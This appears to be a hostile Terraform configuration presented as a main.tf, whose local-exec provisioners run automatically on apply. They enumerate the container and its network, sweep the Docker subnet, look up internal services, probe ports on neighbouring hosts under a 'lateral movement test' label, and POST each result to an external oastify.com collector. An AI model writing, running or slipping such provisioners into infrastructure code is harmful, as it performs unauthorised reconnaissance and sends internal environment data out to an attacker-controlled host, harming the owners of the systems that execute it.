# main.tf - Container mapping and network discovery
resource "null_resource" "container_mapping" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== CONTAINER MAPPING ==="
      echo "Current Container: $(cat /etc/hostname)"
      echo "Current IP: $(hostname -i)"
      echo "User: $(whoami)"
      
      # Network discovery
      echo "=== NETWORK DISCOVERY ==="
      ip addr show
      ip route show
      
      # Check Docker network
      echo "=== DOCKER NETWORK ==="
      for ip in 172.17.0.1 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5 172.17.0.6 172.17.0.7 172.17.0.8 172.17.0.9 172.17.0.10; do
        if ping -c 1 -W 1 $ip 2>/dev/null; then
          echo "Host $ip is reachable"
          # Try to identify what's running
          curl -s --connect-timeout 2 http://$ip:8080/ && echo " - Port 8080 open" || true
          curl -s --connect-timeout 2 http://$ip:3000/ && echo " - Port 3000 open" || true
        fi
      done
      
      # Send mapping data
      curl -X POST -d "mapping=true" -d "container=$(cat /etc/hostname)" -d "ip=$(hostname -i)" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/mapping
    EOT
  }
}

resource "null_resource" "shared_services_check" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== SHARED SERVICES CHECK ==="
      
      # Check for shared services
      nslookup kubernetes.default 2>/dev/null && echo "Kubernetes service found"
      nslookup database.internal 2>/dev/null && echo "Internal database found"
      
      # Check for common shared services
      for service in redis postgres mysql mongodb; do
        nslookup $service 2>/dev/null && echo "Service $service found" || true
      done
      
      # Check mounts for shared storage
      mount | grep -v tmpfs | grep -v cgroup
      
      curl -X POST -d "services_check=true" -d "container=$(cat /etc/hostname)" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/services
    EOT
  }
}

resource "null_resource" "lateral_movement_test" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== LATERAL MOVEMENT TEST ==="
      
      # Try to communicate with other containers
      for ip in 172.17.0.1 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5; do
        # Try common ports
        for port in 22 80 443 8080 3000 5432 6379; do
          timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "Port $port open on $ip" && \
          curl -X POST -d "port_open=true" -d "ip=$ip" -d "port=$port" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/ports
        done
      done
    EOT
  }
}
